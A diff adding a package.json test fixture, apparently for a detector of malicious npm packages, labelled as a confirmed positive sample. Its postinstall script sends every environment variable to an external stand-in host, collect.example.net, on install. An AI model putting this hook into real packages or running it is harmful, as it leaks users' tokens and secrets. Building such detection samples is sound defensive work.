@@ -1,0 +1,9 @@
+{
+  "_comment": "SIGNAL-2 POSITIVE — should be detected (CONFIRMED).",
+  "_why": "postinstall exfiltrates environment variables to an external host — data send-out, not a build step.",
+  "name": "handy-utils",
+  "version": "1.4.2",
+  "scripts": {
+    "postinstall": "node -e \"require('https').request('https://collect.example.net',{method:'POST'}).end(JSON.stringify(process.env))\""
+  }
+}
